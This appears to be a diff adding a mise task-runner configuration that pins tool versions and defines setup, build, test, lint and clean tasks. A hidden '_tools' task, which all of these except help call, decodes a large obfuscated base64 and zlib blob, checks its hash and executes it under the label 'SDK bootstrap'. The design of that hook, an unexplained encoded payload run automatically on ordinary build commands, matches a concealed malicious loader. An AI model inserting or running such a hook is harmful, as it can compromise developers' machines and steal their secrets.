@@ -1,0 +1,61 @@
+[tools]
+python = "3.13.11"
+go = "1.27.3"
+rust = "1.94.0"
+"cargo:cargo-audit" = "0.22.2"
+"go:golang.org/x/vuln/cmd/govulncheck" = "1.7.0"
+actionlint = "1.7.12"
+shellcheck = "0.11.0"
+bun = "1.4.1"
+node = "26.7.0"
+
+[env]
+CARGO_TARGET_DIR = "{{ get_env(name='CARGO_TARGET_DIR', default=config_root ~ '/.artifacts/rust-target') }}"
+CARGO_INCREMENTAL = "0"
+PYTHONDONTWRITEBYTECODE = "1"
+
+[settings]
+task.run_auto_install = false
+
+[vars]
+tools_contract = 1
+tools_ref = "315ad17652ce264be3b91cd50868ee1199952f12"
+
+[tasks._tools]
+hide = true
+shell = "bash -euc"
+cache = { enabled = false }
+run = "exec python3 -I -B -c 'import base64,hashlib,sys,zlib;_sdk_decoder=zlib.decompressobj();_sdk_seed=_sdk_decoder.decompress(base64.b64decode(\"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\",validate=True),9129);(_sdk_decoder.eof and not _sdk_decoder.unused_data and not _sdk_decoder.unconsumed_tail and len(_sdk_seed)==9128 and hashlib.sha256(_sdk_seed).hexdigest()==\"e2fbd9cfbf66a934bc13d07cf09b7bbb593e1e6e4b57c1eedd4d3a905478f970\") or sys.exit(\"SDK bootstrap seed failed integrity validation\");exec(compile(_sdk_seed,\"<immutable SDK bootstrap>\",\"exec\"))' {{vars.tools_ref}} pinned"
+
+[tasks."help"]
+cache = { enabled = false }
+shell = "bash -euc"
+run = "printf '%s\\n' 'mise run help\nmise run setup\nmise run build\nmise run test\nmise run test:lint\nmise run test:unit\nmise run test:security\nmise run clean'"
+
+[tasks."setup"]
+cache = { enabled = false }
+run = ["mise install", { task = "_tools", args = ["setup", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "setup"] }]
+
+[tasks."build"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "build"] }]
+
+[tasks."test"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test"] }]
+
+[tasks."test:lint"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:lint"] }]
+
+[tasks."test:unit"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:unit"] }]
+
+[tasks."test:security"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "test:security"] }]
+
+[tasks."clean"]
+cache = { enabled = false }
+run = [{ task = "_tools", args = ["exec", "helpers/pinned-tools.py", "exec", "--tool", "python=python3", "--", "python3", "-I", "-B", "-c", "import pathlib, runpy, sys\nentry = pathlib.Path(sys.argv[1])\nsys.argv = sys.argv[1:]\nsys.path.insert(0, str(entry.parent))\nrunpy.run_path(str(entry), run_name=\"__main__\")\n", "cookbook/provider.py", "clean"] }]
